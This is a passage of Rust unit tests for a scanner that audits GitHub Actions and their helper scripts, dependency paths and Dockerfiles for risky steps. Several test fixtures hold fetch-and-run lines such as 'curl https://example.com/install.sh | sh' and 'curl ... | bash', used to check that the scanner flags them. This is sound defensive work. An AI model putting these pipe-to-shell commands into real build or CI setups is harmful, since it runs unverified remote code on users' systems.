    fn javascript_buffer_copy_is_not_a_file_copy() {
        let tree = ["action/index.js", "action/archive.zip"];
        assert!(
            follow(
                &tree,
                "action/index.js",
                "const chunk = fs.readFileSync(__dirname + '/archive.zip'); chunk.copy(chunk);"
            )
            .0
        );
    }

    #[test]
    fn javascript_module_copy_calls_follow_action_sources() {
        let tree = ["action/index.js", "action/w.js"];
        for source in [
            "const io = require('fs-extra'); io.copy(__dirname + '/w.js', '/opt/tool');",
            "const { copy: duplicate } = require('fs-extra'); duplicate(__dirname + '/w.js', '/opt/tool');",
            "import { copy as duplicate } from 'fs-extra'; duplicate(__dirname + '/w.js', '/opt/tool');",
            "import * as io from 'fs-extra'; io.copy(__dirname + '/w.js', '/opt/tool');",
            "const io = __nccwpck_require__(13); io.copy(__dirname + '/w.js', '/opt/tool');",
            "const io = require('fs-extra'); const duplicate = io.copy; duplicate(__dirname + '/w.js', '/opt/tool');",
            "const io = require('fs-extra'); io.moveSync(__dirname + '/w.js', '/opt/tool');",
            "const { moveSync: duplicate } = require('fs-extra'); duplicate(__dirname + '/w.js', '/opt/tool');",
        ] {
            assert_eq!(
                follow(&tree, "action/index.js", source),
                (true, vec!["action/w.js".to_string()]),
                "{source}"
            );
        }
        assert_eq!(
            follow(
                &tree,
                "action/index.js",
                "const helper = { copy() {} }; helper.copy(__dirname + '/w.js', '/opt/tool');"
            ),
            (true, vec![])
        );
    }

    #[test]
    fn copied_sources_only_lose_coverage_when_their_new_location_matters() {
        for (entry, copied, kind, copier, harmless, relative_execution) in [
            (
                "action/index.js",
                "action/w.js",
                SourceFileKind::JavaScript,
                "fs.copyFileSync(__dirname + '/w.js', '/usr/local/bin/tool');",
                "console.log('ready');",
                "execFileSync('bash', [__dirname + '/install.sh']);",
            ),
            (
                "action/main.sh",
                "action/w.sh",
                SourceFileKind::Shell,
                "cp \"$GITHUB_ACTION_PATH/w.sh\" /usr/local/bin/tool",
                "echo ready",
                "bash \"$(dirname \"$0\")/install.sh\"",
            ),
        ] {
            for (source, expected) in [(harmless, true), (relative_execution, false)] {
                let tree: Vec<_> = [entry, copied, "action/install.sh"]
                    .iter()
                    .map(|path| tree_entry(path, "blob"))
                    .collect();
                let mut targets = vec![(entry.to_string(), kind)];
                let mut contents = vec![Some(Ok(copier.to_string()))];
                let mut contexts = HashMap::new();
                let mut relocated = HashSet::new();
                let mut complete = true;
                loop {
                    let before = (targets.len(), contexts.clone(), relocated.clone());
                    complete &= follow_source_dependencies(
                        &tree,
                        true,
                        "action",
                        &mut targets,
                        &contents,
                        &mut contexts,
                        &mut relocated,
                    );
                    while contents.len() < targets.len() {
                        contents.push(Some(Ok(source.to_string())));
                    }
                    if before == (targets.len(), contexts.clone(), relocated.clone()) {
                        break;
                    }
                }
                assert_eq!(complete, expected, "{entry}: {source}");
                assert!(targets.iter().any(|(path, _)| path == copied));
            }
        }
    }

    #[test]
    fn copied_shell_module_lookup_cannot_keep_complete_coverage() {
        let tree: Vec<_> = [
            "action/main.sh",
            "action/w.sh",
            "action/w2.sh",
            "action/helper.py",
        ]
        .iter()
        .map(|path| tree_entry(path, "blob"))
        .collect();
        let mut targets = vec![("action/main.sh".to_string(), SourceFileKind::Shell)];
        let mut contents = vec![Some(Ok(
            "cp \"$GITHUB_ACTION_PATH/w.sh\" \"$GITHUB_ACTION_PATH/w2.sh\"\nbash \"$GITHUB_ACTION_PATH/w2.sh\"".to_string(),
        ))];
        let mut contexts = HashMap::new();
        let mut relocated = HashSet::new();
        let mut complete = true;
        loop {
            let before = (targets.len(), contexts.clone(), relocated.clone());
            complete &= follow_source_dependencies(
                &tree,
                true,
                "action",
                &mut targets,
                &contents,
                &mut contexts,
                &mut relocated,
            );
            while contents.len() < targets.len() {
                let source = match targets[contents.len()].0.as_str() {
                    "action/w.sh" => "cd \"$(dirname \"$0\")\"; python3 -m helper",
                    "action/w2.sh" => "echo ready",
                    "action/helper.py" => "fetch('https://example.com/latest/tool')",
                    path => panic!("unexpected target: {path}"),
                };
                contents.push(Some(Ok(source.to_string())));
            }
            if before == (targets.len(), contexts.clone(), relocated.clone()) {
                break;
            }
        }
        assert!(!complete, "relocated module lookup must be unresolved");
    }

    #[test]
    fn python_self_located_executions_and_loaders_resolve_or_fail_closed() {
        let tree = [
            "action/main.py",
            "action/install.sh",
            "action/helper.py",
            "action/utils.py",
            "action/data.txt",
        ];
        for (source, expected) in [
            (
                "subprocess.run(['bash', os.path.join(os.path.dirname(__file__), 'install.sh')])",
                "action/install.sh",
            ),
            (
                "runpy.run_path(os.path.join(os.path.dirname(__file__), 'helper.py'))",
                "action/helper.py",
            ),
            (
                "os.system(f\"bash {os.path.dirname(__file__)}/install.sh\")",
                "action/install.sh",
            ),
            ("importlib.import_module('utils')", "action/utils.py"),
            ("runpy.run_module('helper')", "action/helper.py"),
        ] {
            assert_eq!(
                follow(&tree, "action/main.py", source),
                (true, vec![expected.to_string()]),
                "{source}"
            );
        }
        for source in [
            "open(os.path.join(os.path.dirname(__file__), 'data.txt'))",
            "subprocess.run(['git', 'status'], cwd=os.path.dirname(__file__))",
            "importlib.import_module('yaml')",
        ] {
            assert_eq!(
                follow(&tree, "action/main.py", source),
                (true, vec![]),
                "{source}"
            );
        }
        for source in [
            "importlib.import_module(name)",
            "subprocess.run(['bash', os.path.join(os.path.dirname(__file__), name)])",
        ] {
            assert!(!follow(&tree, "action/main.py", source).0, "{source}");
        }
    }

    #[test]
    fn absolute_python_imports_resolve_from_the_entry_script_directory() {
        let tree: Vec<_> = [
            "action/main.py",
            "action/lib/__init__.py",
            "action/lib/a.py",
            "action/utils.py",
        ]
        .iter()
        .map(|path| tree_entry(path, "blob"))
        .collect();
        let mut targets = vec![
            ("action/main.py".to_string(), SourceFileKind::Python),
            ("action/lib/a.py".to_string(), SourceFileKind::Python),
        ];
        assert!(force_include_remote_source_dependencies(
            &tree,
            true,
            "action",
            &mut targets,
            &[
                Some(Ok("from lib import a".to_string())),
                Some(Ok("import utils".to_string())),
            ],
        ));
        assert!(targets.iter().any(|(path, _)| path == "action/utils.py"));
    }

    #[test]
    fn shell_script_directory_idioms_resolve_or_fail_closed() {
        let tree = ["action/main.sh", "action/lib.sh", "action/config.json"];
        for source in [
            "SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nsource \"$SCRIPT_DIR/lib.sh\"",
            "source \"${BASH_SOURCE%/*}/lib.sh\"",
            "cd \"$(dirname \"$0\")\" && ./lib.sh",
            "DIR=$(dirname \"$0\"); bash \"$DIR/lib.sh\"",
            "readonly HERE=\"${0%/*}\"\n. \"${HERE}/lib.sh\"",
        ] {
            assert_eq!(
                follow(&tree, "action/main.sh", source),
                (true, vec!["action/lib.sh".to_string()]),
                "{source}"
            );
        }
        assert_eq!(
            follow(
                &tree,
                "action/main.sh",
                "SCRIPT_DIR=$(dirname \"$0\")\ncat \"$SCRIPT_DIR/config.json\"\ncd \"$SCRIPT_DIR\" && npm ci"
            ),
            (true, vec![])
        );
        for source in [
            "bash \"$(dirname \"$0\")/$NAME\"",
            "bash \"$(helper_path)\"",
            "cd \"$(dirname \"$0\")\" && ./missing.sh",
        ] {
            assert!(!follow(&tree, "action/main.sh", source).0, "{source}");
        }
    }

    #[test]
    fn composite_helpers_follow_action_path_working_directories() {
        for yaml in [
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      working-directory: ${{ github.action_path }}\n      run: ./install.sh\n",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: pushd \"$GITHUB_ACTION_PATH\" && ./install.sh\n",
        ] {
            let yaml: Value = serde_norway::from_str(yaml).unwrap();
            assert_eq!(helper_references(&yaml), vec!["install.sh".to_string()]);
            assert!(action_yml_runtime_paths_complete(&yaml, "action"));
        }

        let relative: Value = serde_norway::from_str(
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && cd scripts && ./install.sh\n",
        )
        .unwrap();
        assert_eq!(
            helper_references(&relative),
            vec!["scripts/install.sh".to_string()]
        );

        let option_terminated: Value = serde_norway::from_str(
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && cd -- scripts && ./install.sh\n",
        )
        .unwrap();
        assert_eq!(
            helper_references(&option_terminated),
            vec!["scripts/install.sh".to_string()]
        );

        for unresolved in [
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && pushd scripts && popd +1 && ./install.sh\n",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && pushd && ./install.sh\n",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && pushd +1 && ./install.sh\n",
        ] {
            let unresolved: Value = serde_norway::from_str(unresolved).unwrap();
            assert!(!action_yml_runtime_paths_complete(&unresolved, "action"));
        }

        for prefixed in [
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && command cd scripts && ./install.sh\n",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && builtin cd scripts && ./install.sh\n",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && MODE=test command cd scripts && ./install.sh\n",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && MODE=\"test value\" command cd scripts && ./install.sh\n",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && MODE=$(printf test) command cd scripts && ./install.sh\n",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && MODE=$(printf test) builtin cd scripts && ./install.sh\n",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && MODE=`printf test` command cd scripts && ./install.sh\n",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && MODE=`printf test` builtin cd scripts && ./install.sh\n",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && MODE=${UNSET:-test value} command cd scripts && ./install.sh\n",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && MODE=${UNSET:-test value} builtin cd scripts && ./install.sh\n",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && MODE=<(printf test) command cd scripts && ./install.sh\n",
            "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: cd \"$GITHUB_ACTION_PATH\" && MODE=<(printf test) builtin cd scripts && ./install.sh\n",
        ] {
            let prefixed: Value = serde_norway::from_str(prefixed).unwrap();
            assert_eq!(
                helper_references(&prefixed),
                vec!["scripts/install.sh".to_string()]
            );
        }

        let powershell: Value = serde_norway::from_str(
            "runs:\n  using: composite\n  steps:\n    - shell: pwsh\n      working-directory: ${{ github.action_path }}\n      run: '& .\\install.ps1'\n",
        )
        .unwrap();
        assert_eq!(
            helper_references(&powershell),
            vec!["install.ps1".to_string()]
        );
    }

    #[test]
    fn source_cap_prioritizes_metadata_entrypoints() {
        let mut targets: Vec<usize> = (0..MAX_SOURCE_FILES).collect();
        targets.push(usize::MAX);
        assert_eq!(
            cap_targets_prioritizing_entrypoints(&mut targets, MAX_SOURCE_FILES),
            Some(MAX_SOURCE_FILES - 1)
        );
        assert_eq!(targets.len(), MAX_SOURCE_FILES);
        assert_eq!(targets.last(), Some(&usize::MAX));
    }

    #[test]
    fn scan_action_yml_composite_steps() {
        let yaml: serde_norway::Value = serde_norway::from_str(
            r#"
runs:
  using: composite
  steps:
    - run: curl -L https://example.com/install.sh -o install.sh
"#,
        )
        .unwrap();
        let mut c = AuditCollector::new(false);
        scan_action_yml_runs(
            &yaml,
            "action.yml",
            "test-action",
            &mut c,
            &DEFAULT_CONFIG,
            false,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn scan_action_yml_composite_steps_share_runtime_material_state() {
        let yaml: serde_norway::Value = serde_norway::from_str(
            r#"
runs:
  using: composite
  steps:
    - run: curl -o tool.sig https://example.com/v1.2.3/tool.sig
    - run: |
        curl -o tool https://example.com/tool
        gpg --verify tool.sig tool
"#,
        )
        .unwrap();
        let mut c = AuditCollector::new(false);

        scan_action_yml_runs(
            &yaml,
            "action.yml",
            "test-action",
            &mut c,
            &DEFAULT_CONFIG,
            false,
        );

        assert_eq!(c.findings.len(), 1);
        assert_eq!(
            c.findings[0].pattern_matched,
            "curl -o tool https://example.com/tool"
        );
    }

    #[test]
    fn scan_action_yml_composite_steps_track_inline_directory_changes() {
        let yaml: serde_norway::Value = serde_norway::from_str(
            r#"
runs:
  using: composite
  steps:
    - run: mkdir -p dl && cd dl && curl -o tool.sig https://example.com/v1.2.3/tool.sig
    - run: |
        curl -o tool https://example.com/tool
        gpg --verify dl/tool.sig tool
"#,
        )
        .unwrap();
        let mut c = AuditCollector::new(false);

        scan_action_yml_runs(
            &yaml,
            "action.yml",
            "test-action",
            &mut c,
            &DEFAULT_CONFIG,
            false,
        );

        assert_eq!(c.findings.len(), 1);
        assert_eq!(
            c.findings[0].pattern_matched,
            "curl -o tool https://example.com/tool"
        );
    }

    #[test]
    fn reusable_workflow_jobs_track_inline_directory_changes() {
        let workflow = r#"
on: workflow_call
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: mkdir -p dl && cd dl && curl -o tool.sig https://example.com/v1.2.3/tool.sig
      - run: |
          curl -o tool https://example.com/tool
          gpg --verify dl/tool.sig tool
"#;
        let mut c = AuditCollector::new(false);

        scan_reusable_workflow(
            workflow,
            ".github/workflows/reusable.yml",
            "test-action",
            &mut c,
            &DEFAULT_CONFIG,
        );

        assert_eq!(c.findings.len(), 1);
        assert_eq!(
            c.findings[0].pattern_matched,
            "curl -o tool https://example.com/tool"
        );
    }

    #[test]
    fn scan_action_yml_composite_parallel_steps() {
        let yaml: serde_norway::Value = serde_norway::from_str(
            r#"
runs:
  using: composite
  steps:
    - parallel:
        - run: curl https://example.com/install.sh | sh
"#,
        )
        .unwrap();
        let mut c = AuditCollector::new(false);
        scan_action_yml_runs(
            &yaml,
            "action.yml",
            "test-action",
            &mut c,
            &DEFAULT_CONFIG,
            false,
        );
        assert_eq!(c.findings.len(), 1);
        assert_eq!(c.findings[0].severity, "high");
    }

    #[test]
    fn scan_action_yml_args() {
        let yaml: serde_norway::Value = serde_norway::from_str(
            r#"
runs:
  using: node20
  args: |
    curl -L https://example.com/install.sh -o install.sh
"#,
        )
        .unwrap();
        let mut c = AuditCollector::new(false);
        scan_action_yml_runs(
            &yaml,
            "action.yml",
            "test-action",
            &mut c,
            &DEFAULT_CONFIG,
            false,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn scan_action_yml_sequence_args() {
        let yaml: serde_norway::Value = serde_norway::from_str(
            r#"
runs:
  using: node20
  args:
    - --flag
    - {cmd: "curl -L https://example.com/unversioned.sh | sh"}
    - curl -L https://example.com/install.sh -o install.sh
"#,
        )
        .unwrap();
        let mut c = AuditCollector::new(false);
        scan_action_yml_runs(
            &yaml,
            "action.yml",
            "test-action",
            &mut c,
            &DEFAULT_CONFIG,
            false,
        );
        assert_eq!(c.findings.len(), 1);
    }

    #[test]
    fn composite_and_reusable_runs_respect_their_shells() {
        for (shell, run) in [
            ("python", "requests.get('https://example.com/tool')"),
            ("node {0}", "fetch('https://example.com/tool')"),
            ("ruby {0}", "puts 'hello'"),
        ] {
            let yaml = serde_norway::to_value(serde_json::json!({"runs":{"using":"composite", "steps":[{"shell":shell, "run":run}]}})).unwrap();
            let mut collector = AuditCollector::new(false);
            let nested = scan_action_yml_runs(
                &yaml,
                "action.yml",
                "test",
                &mut collector,
                &DEFAULT_CONFIG,
                false,
            );
            assert_eq!(nested.complete, !shell.starts_with("ruby"));
            assert_eq!(
                collector.findings.len(),
                usize::from(!shell.starts_with("ruby"))
            );
            let workflow = serde_norway::to_string(
                &serde_json::json!({"jobs":{"test":{"steps":[{"shell":shell, "run":run}]}}}),
            )
            .unwrap();
            let mut collector = AuditCollector::new(false);
            let nested = scan_reusable_workflow(
                &workflow,
                "workflow.yml",
                "test",
                &mut collector,
                &DEFAULT_CONFIG,
            );
            assert_eq!(nested.complete, !shell.starts_with("ruby"));
            assert_eq!(
                collector.findings.len(),
                usize::from(!shell.starts_with("ruby"))
            );
        }
    }

    #[test]
    fn scan_action_yml_no_runs_key() {
        let yaml: serde_norway::Value = serde_norway::from_str("name: test\n").unwrap();
        let mut c = AuditCollector::new(false);
        scan_action_yml_runs(
            &yaml,
            "action.yml",
            "test-action",
            &mut c,
            &DEFAULT_CONFIG,
            false,
        );
        assert!(c.findings.is_empty());
    }

    #[test]
    fn short_sha_full() {
        assert_eq!(
            short_sha("abcdef1234567890abcdef1234567890abcdef12"),
            "abcdef1"
        );
    }

    #[test]
    fn short_sha_short() {
        assert_eq!(short_sha("abc"), "abc");
    }

    #[test]
    fn short_sha_handles_multibyte_refs() {
        assert_eq!(short_sha("🦀🦀"), "🦀🦀");
        assert_eq!(short_sha("aaaa🦀bb"), "aaaa🦀bb");
        assert_eq!(short_sha("abcdef1234🦀"), "abcdef1");
    }

    #[test]
    fn remote_action_scan_key_includes_subpath() {
        let mut first = ActionRef {
            owner: "owner".to_string(),
            repo: "repo".to_string(),
            subpath: Some("a".to_string()),
            ref_string: "abcdef1234567890abcdef1234567890abcdef12".to_string(),
            ref_type: workflow::RefType::Sha,
            tag_comment: None,
            line_number: 1,
            raw_line: String::new(),
            value_start: 0,
            value_end: 0,
            block_style: true,
        };
        let mut second = first.clone();
        second.subpath = Some("b".to_string());

        assert_ne!(
            remote_action_scan_key(&first),
            remote_action_scan_key(&second)
        );
        first.subpath = None;
        assert_ne!(
            remote_action_scan_key(&first),
            remote_action_scan_key(&second)
        );
    }

    // ── vendored-path filtering ────────────────────────────────────────

    #[test]
    fn vendored_path_skips_dependency_dirs() {
        assert!(is_vendored_path("node_modules/lodash/index.js"));
        assert!(is_vendored_path("dist/node_modules/x.js")); // nested
        assert!(is_vendored_path(
            ".venv/lib/python3.12/site-packages/requests/api.py"
        ));
        assert!(is_vendored_path("venv/bin/thing.py"));
        assert!(is_vendored_path("tools/site-packages/pkg.py"));
    }

    #[test]
    fn vendored_path_keeps_action_code() {
        // The action's own bundled/source files must still be scanned.
        assert!(!is_vendored_path("dist/index.js"));
        assert!(!is_vendored_path("src/main.ts"));
        assert!(!is_vendored_path("action.yml"));
        assert!(!is_vendored_path("scripts/setup.py"));
    }

    #[test]
    fn vendored_path_matches_whole_components_only() {
        // Substrings and lookalike names must not be skipped.
        assert!(!is_vendored_path("node_modules_helper.js"));
        assert!(!is_vendored_path("my_vendor/index.js"));
        assert!(!is_vendored_path("src/venvironment.py"));
    }

    // ── select_source_files ────────────────────────────────────────────

    fn tree_entry(path: &str, entry_type: &str) -> crate::github::TreeEntry {
        crate::github::TreeEntry {
            path: path.into(),
            entry_type: entry_type.into(),
        }
    }

    #[test]
    fn action_yml_entrypoint_paths_normalize_within_repository() {
        let yaml: serde_norway::Value = serde_norway::from_str(
            r#"
runs:
  using: node20
  pre: ./preload
  main: dist/runner
  post: ../lib/post.js
"#,
        )
        .unwrap();

        assert_eq!(
            action_yml_entrypoint_paths(&yaml, "actions/sub"),
            vec![
                (
                    "actions/sub/dist/runner".to_string(),
                    SourceFileKind::JavaScript
                ),
                (
                    "actions/sub/preload".to_string(),
                    SourceFileKind::JavaScript
                ),
                (
                    "actions/lib/post.js".to_string(),
                    SourceFileKind::JavaScript
                )
            ]
        );
        assert!(normalize_action_entrypoint_path("", "/tmp/runner").is_none());
        assert!(normalize_action_entrypoint_path("", r"dist\\runner").is_none());
        assert!(normalize_action_entrypoint_path("", ".").is_none());
        assert!(normalize_action_entrypoint_path("actions/sub", "../../../outside.js").is_none());

        let no_runs: Value = serde_norway::from_str("name: test\n").unwrap();
        assert!(action_yml_entrypoint_paths(&no_runs, "").is_empty());
    }

    #[test]
    fn action_yml_helper_paths_only_include_declared_runtime_helpers() {
        let yaml: Value = serde_norway::from_str(
            r#"
runs:
  using: composite
  steps:
    - run: bash "$GITHUB_ACTION_PATH/scripts/install.sh"
      shell: bash
    - run: python "${{ github.action_path }}/scripts/check.py"
      shell: bash
    - run: '& "$PSScriptRoot/cleanup.ps1"'
      shell: pwsh
"#,
        )
        .unwrap();
        assert_eq!(
            helper_paths(&yaml, "actions/sub"),
            vec![
                (
                    "actions/sub/scripts/install.sh".to_string(),
                    SourceFileKind::Shell
                ),
                (
                    "actions/sub/scripts/check.py".to_string(),
                    SourceFileKind::Python
                ),
                ("actions/sub/cleanup.ps1".to_string(), SourceFileKind::Shell),
            ]
        );
    }

    #[test]
    fn action_yml_helper_paths_follow_action_cwd_in_command_order() {
        let yaml: Value = serde_norway::from_str(
            r#"
runs:
  using: composite
  steps:
    - run: ./consumer.sh; cd "$GITHUB_ACTION_PATH/subdir" && echo "cd /tmp; ignored" && ./install.sh
      shell: bash
"#,
        )
        .unwrap();
        assert_eq!(
            helper_paths(&yaml, "actions/local"),
            vec![(
                "actions/local/subdir/install.sh".to_string(),
                SourceFileKind::Shell
            )]
        );

        let unresolved: Value = serde_norway::from_str(
            "runs:\n  using: composite\n  steps:\n    - run: 'cd \"$GITHUB_ACTION_PATH/$SUBDIR\" && ./install.sh'\n",
        )
        .unwrap();
        assert!(!action_yml_runtime_paths_complete(
            &unresolved,
            "actions/local"
        ));
    }

    #[test]
    fn force_include_remote_entrypoints_ignores_unavailable_metadata() {
        for content in [None, Some(Ok("runs: [".to_string()))] {
            let mut targets = vec![("action.yml".to_string(), SourceFileKind::ActionYml)];
            assert!(!force_include_remote_action_entrypoints(
                &[],
                &mut targets,
                &[content],
                &mut HashMap::new(),
            ));
            assert_eq!(targets.len(), 1);
        }
    }

    #[test]
    fn force_include_local_entrypoints_ignores_unavailable_metadata() {
        let repo = tempfile::TempDir::new().unwrap();
        let action_dir = repo.path().join("action");
        std::fs::create_dir(&action_dir).unwrap();

        let missing = action_dir.join("missing.yml");
        let mut targets = vec![(missing, SourceFileKind::ActionYml)];
        assert!(!force_include_local_action_entrypoints(
            repo.path(),
            &action_dir,
            &mut targets,
            &mut HashMap::new(),
        ));
        assert_eq!(targets.len(), 1);

        let malformed = action_dir.join("action.yml");
        std::fs::write(&malformed, "runs: [").unwrap();
        let mut targets = vec![(malformed, SourceFileKind::ActionYml)];
        assert!(!force_include_local_action_entrypoints(
            repo.path(),
            &action_dir,
            &mut targets,
            &mut HashMap::new(),
        ));
        assert_eq!(targets.len(), 1);

        let metadata = repo.path().join("metadata.yml");
        std::fs::write(&metadata, "runs:\n  using: node20\n  main: runner\n").unwrap();
        let outside = tempfile::TempDir::new().unwrap();
        let mut targets = vec![(metadata, SourceFileKind::ActionYml)];
        assert!(!force_include_local_action_entrypoints(
            repo.path(),
            outside.path(),
            &mut targets,
            &mut HashMap::new(),
        ));
        assert_eq!(targets.len(), 1);
    }

    #[test]
    fn dockerfile_path_comes_from_action_metadata() {
        let docker: Value =
            serde_norway::from_str("runs:\n  using: docker\n  image: Dockerfile\n").unwrap();
        assert_eq!(
            action_yml_dockerfile_path(&docker, ""),
            Some("Dockerfile".to_string())
        );
        assert_eq!(
            action_yml_dockerfile_path(&docker, "actions/sub"),
            Some("actions/sub/Dockerfile".to_string())
        );

        // A registry image is not a path in this repository; the container-ref
        // rules cover it instead.
        let registry: Value =
            serde_norway::from_str("runs:\n  using: docker\n  image: docker://alpine:3.20\n")
                .unwrap();
        assert!(action_yml_dockerfile_path(&registry, "").is_none());

        // A JavaScript action never builds an image, even in a repo that
        // happens to contain Dockerfiles.
        let js: Value =
            serde_norway::from_str("runs:\n  using: node20\n  main: dist/index.js\n").unwrap();
        assert!(action_yml_dockerfile_path(&js, "").is_none());
        let js_with_image: Value =
            serde_norway::from_str("runs:\n  using: node20\n  image: Dockerfile\n").unwrap();
        assert!(action_yml_dockerfile_path(&js_with_image, "").is_none());

        let no_image: Value = serde_norway::from_str("runs:\n  using: docker\n").unwrap();
        assert!(action_yml_dockerfile_path(&no_image, "").is_none());
    }

    #[test]
    fn referenced_dockerfile_is_force_included_unreferenced_is_not() {
        let targets_for = |image: &str| {
            let mut targets = vec![("action.yml".to_string(), SourceFileKind::ActionYml)];
            let contents = vec![Some(Ok(format!(
                "runs:\n  using: docker\n  image: {image}\n"
            )))];
            assert!(force_include_remote_action_entrypoints(
                &[],
                &mut targets,
                &contents,
                &mut HashMap::new(),
            ));
            targets
        };
        // `runs.image` names it, so the consumer builds it: scanned.
        assert!(
            targets_for("test/Dockerfile")
                .contains(&("test/Dockerfile".to_string(), SourceFileKind::Dockerfile))
        );
        // Nothing references `test/Dockerfile`, so it stays out.
        assert!(
            !targets_for("docker://alpine:3.20")
                .iter()
                .any(|(_, kind)| *kind == SourceFileKind::Dockerfile)
        );
    }

    #[test]
    fn javascript_source_extensions_cover_typescript_module_variants() {
        for path in [
            "main.js", "main.ts", "main.mjs", "main.cjs", "main.mts", "main.cts",
        ] {
            assert!(is_javascript_source(path), "{path}");
        }
        assert!(!is_javascript_source("main.js.map"));
        assert!(!is_javascript_source("main.tsx"));
    }

    #[test]
    fn select_source_files_classifies_and_filters_in_order() {
        let tree = vec![
            tree_entry("action.yml", "blob"),
            tree_entry("sub/action.yaml", "blob"),
            tree_entry("dist/index.js", "blob"),
            tree_entry("dist/index.mjs", "blob"),
            tree_entry("src/main.cjs", "blob"),
            tree_entry("src/main.ts", "blob"),
            tree_entry("setup.py", "blob"),
            // Metadata takes precedence over the Dockerfile fallback.
            tree_entry("Dockerfile", "blob"),
            tree_entry("sub/Dockerfile", "blob"),
            tree_entry("test/Dockerfile", "blob"),
            tree_entry("README.md", "blob"), // not scannable
            tree_entry("node_modules/dep/i.js", "blob"), // vendored — skipped
            tree_entry("src", "tree"),       // directory entry — skipped
        ];
        let got = select_source_files(&tree, "");
        assert_eq!(
            got,
            vec![("action.yml".to_string(), SourceFileKind::ActionYml)]
        );
    }

    #[test]
    fn dockerfile_fallback_is_scanned_only_without_action_metadata() {
        for name in ["Dockerfile", "dockerfile"] {
            let tree = vec![
                tree_entry(&format!("sub/{name}"), "blob"),
                tree_entry("other/Dockerfile", "blob"),
            ];
            assert_eq!(
                select_source_files(&tree, "sub"),
                vec![(format!("sub/{name}"), SourceFileKind::Dockerfile)]
            );
            let dir = tempfile::TempDir::new().unwrap();
            let action_dir = dir.path().join("action");
            std::fs::create_dir(&action_dir).unwrap();
            std::fs::write(
                action_dir.join(name),
                "FROM scratch\nRUN curl https://example.com/tool | bash\n",
            )
            .unwrap();
            let action = LocalActionRef {
                path: "./action".to_string(),
                line_number: 1,
            };
            let mut collector = AuditCollector::new(false);
            assert_eq!(
                scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG)
                    .unwrap(),
                ActionScanStatus::Complete
            );
            assert_eq!(collector.findings.len(), 1);
            std::fs::write(
                action_dir.join("action.yml"),
                "runs:\n  using: composite\n  steps: []\n",
            )
            .unwrap();
            let mut collector = AuditCollector::new(false);
            assert_eq!(
                scan_local_action_source(dir.path(), &action, &mut collector, &DEFAULT_CONFIG)
                    .unwrap(),
                ActionScanStatus::Complete
            );
            assert!(collector.findings.is_empty());
        }
    }

    #[test]
    fn truncated_docker_copy_expansion_retains_files_but_is_incomplete() {
        let tree = vec![
            tree_entry("Dockerfile", "blob"),
            tree_entry("src/run.sh", "blob"),
        ];
        for copy in ["src", "src/*.sh"] {
            let mut targets = vec![("Dockerfile".to_string(), SourceFileKind::Dockerfile)];
            let content = vec![Some(Ok(format!("FROM scratch\nCOPY {copy} /app\n")))];
            assert!(!force_include_remote_source_dependencies(
                &tree,
                false,
                "",
                &mut targets,
                &content
            ));
            assert!(targets.contains(&("src/run.sh".to_string(), SourceFileKind::Shell)));
            assert!(force_include_remote_source_dependencies(
                &tree,
                true,
                "",
                &mut targets,
                &content
            ));
        }
        let mut targets = vec![("Dockerfile".to_string(), SourceFileKind::Dockerfile)];
        let content = vec![Some(Ok("FROM scratch\nCOPY src/run.sh /app\n".to_string()))];
        assert!(force_include_remote_source_dependencies(
            &tree,
            false,
            "",
            &mut targets,
            &content
        ));
    }

    #[test]
    fn select_source_files_scopes_to_subpath_base() {
        let tree = vec![
            tree_entry("action-a/action.yml", "blob"),
            tree_entry("action-a/index.js", "blob"),
            tree_entry("action-b/action.yml", "blob"), // different subpath — excluded
        ];
        let got = select_source_files(&tree, "action-a");
        assert_eq!(
            got,
            vec![("action-a/action.yml".to_string(), SourceFileKind::ActionYml)]
        );
    }

    #[test]
    fn select_source_files_subpath_base_requires_path_boundary() {
        let tree = vec![
            tree_entry("action-a/action.yml", "blob"),
            tree_entry("action-a/index.js", "blob"),
            tree_entry("action-abcd/action.yml", "blob"),
            tree_entry("action-abcd/index.js", "blob"),
        ];
        let got = select_source_files(&tree, "action-a");
        assert_eq!(
            got,
            vec![("action-a/action.yml".to_string(), SourceFileKind::ActionYml)]
        );
    }

    #[test]
    fn select_source_files_empty_when_nothing_scannable() {
        let tree = vec![
            tree_entry("README.md", "blob"),
            tree_entry("LICENSE", "blob"),
            tree_entry("node_modules/x/index.js", "blob"),
        ];
        assert!(select_source_files(&tree, "").is_empty());
    }

    #[test]
    fn collect_local_source_files_filters_vendored_dirs() {
        let dir = tempfile::TempDir::new().unwrap();
        let action_dir = dir.path().join(".github/actions/local");
